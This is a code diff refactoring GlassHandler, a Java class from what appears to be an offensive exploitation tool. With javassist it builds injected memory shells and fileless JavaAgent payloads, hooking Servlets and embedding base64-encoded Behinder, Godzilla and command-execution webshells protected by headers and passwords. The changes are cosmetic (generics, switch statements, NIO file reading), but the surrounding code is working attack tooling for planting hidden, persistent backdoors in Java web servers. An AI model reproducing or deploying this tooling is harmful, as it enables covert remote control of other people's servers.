@@ -9,7 +9,8 @@ import javassist.CtClass;
 import javassist.bytecode.*;
 import org.apache.commons.codec.binary.Base64;
 
-import java.io.FileInputStream;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.List;
 
 public class GlassHandler {
@@ -29,15 +30,15 @@ public class GlassHandler {
 
             // 内存马类型
             String shellType = "";
-            String memShellName = "";
-            Class memShellClazz = null;
+            String memShellName;
+            Class<?> memShellClazz;
 
             // 如果命令以 MS 开头，则代表是注入内存马
             if (target.startsWith("MS-")) {
                 target = target.substring(3);
 
                 if (target.contains("-")) {
-                    String[] commands = target.split("[-]");
+                    String[] commands = target.split("-");
                     memShellName = commands[0];
                     shellType = target.substring(target.indexOf("-") + 1);
                 } else {
@@ -47,7 +48,7 @@ public class GlassHandler {
             } else if (target.startsWith("Agent")) {
                 // 如果以 Agent 开头，则使用 AgentNoFile 动态进行 JavaAgent 注入
                 // EX-Agent-Lin/Win-Servlet-bx
-                String[] commands = target.split("[-]");
+                String[] commands = target.split("-");
                 return generateAgentClass(commands[1], commands[2], commands.length > 3 ? commands[3] : "");
             } else {
                 // 否则是回显类，或者其他功能
@@ -67,8 +68,8 @@ public class GlassHandler {
         // 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
         if (target.startsWith("LF-")) {
             target = target.substring(3);
-            String filePath = target.contains("-") ? target.split("[-]")[0] : target;
-            CtClass ctClass = Config.POOL.makeClass(new FileInputStream(filePath));
+            String filePath = target.contains("-") ? target.split("-")[0] : target;
+            CtClass ctClass = Config.POOL.makeClass(Files.newInputStream(Paths.get(filePath)));
             ctClass.setName(newClassName);
 
             // 对本地加载的类进行缩短操作
@@ -81,10 +82,10 @@ public class GlassHandler {
         return null;
     }
 
-    public static CtClass generateClass(Class clazz, String shellType, String newClassName) throws Exception {
+    public static CtClass generateClass(Class<?> clazz, String shellType, String newClassName) throws Exception {
 
-        CtClass ctClass = null;
-        byte[] byteCodes = null;
+        CtClass ctClass;
+        byte[] byteCodes;
 
         String exClassName = clazz.getName();
         ctClass = Config.POOL.get(exClassName);
@@ -186,7 +187,7 @@ public class GlassHandler {
 
     public static void prepareClassModifier(CtClass templateClass, String hookType, String args) throws Exception {
         CtClass classModifier = Config.POOL.get(ClassNameHandler.searchClassByName("ClassModifier"));
-        String shell = "";
+        String shell;
 
         // 插入 Hook 点
         if (hookType.equals("Servlet")) {
@@ -197,19 +198,24 @@ public class GlassHandler {
         }
 
         // 如果是冰蝎逻辑
-        if (args.equals("bx")) {
-            shell = Utils.base64Decode(MemShellPayloads.BEHINDER_SHELL_FOR_AGENT);
-            shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.PASSWORD);
-        } else if (args.equals("gz")) {
-            shell = Utils.base64Decode(MemShellPayloads.GODZILLA_SHELL_FOR_AGENT);
-            shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.PASSWORD_ORI, Config.GODZILLA_KEY);
-        } else if (args.equals("gzraw")) {
-            shell = Utils.base64Decode(MemShellPayloads.GODZILLA_RAW_FOR_AGENT);
-            shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.GODZILLA_KEY);
-        } else {
-            // 默认 cmd 逻辑
-            shell = Utils.base64Decode(MemShellPayloads.CMD_SHELL_FOR_AGENT);
-            shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.CMD_HEADER_STRING);
+        switch (args) {
+            case "bx":
+                shell = Utils.base64Decode(MemShellPayloads.BEHINDER_SHELL_FOR_AGENT);
+                shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.PASSWORD);
+                break;
+            case "gz":
+                shell = Utils.base64Decode(MemShellPayloads.GODZILLA_SHELL_FOR_AGENT);
+                shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.PASSWORD_ORI, Config.GODZILLA_KEY);
+                break;
+            case "gzraw":
+                shell = Utils.base64Decode(MemShellPayloads.GODZILLA_RAW_FOR_AGENT);
+                shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.GODZILLA_KEY);
+                break;
+            default:
+                // 默认 cmd 逻辑
+                shell = Utils.base64Decode(MemShellPayloads.CMD_SHELL_FOR_AGENT);
+                shell = String.format(shell, Config.URL_PATTERN.substring(1), Config.HEADER_KEY, Config.HEADER_VALUE, Config.CMD_HEADER_STRING);
+                break;
         }
         // 替换密码，添加 Shell Code
         ClassFieldHandler.insertField(classModifier, "HOOK_METHOD_CODE", "public static String HOOK_METHOD_CODE = \"" + Utils.base64Encode(shell.getBytes()) + "\";");
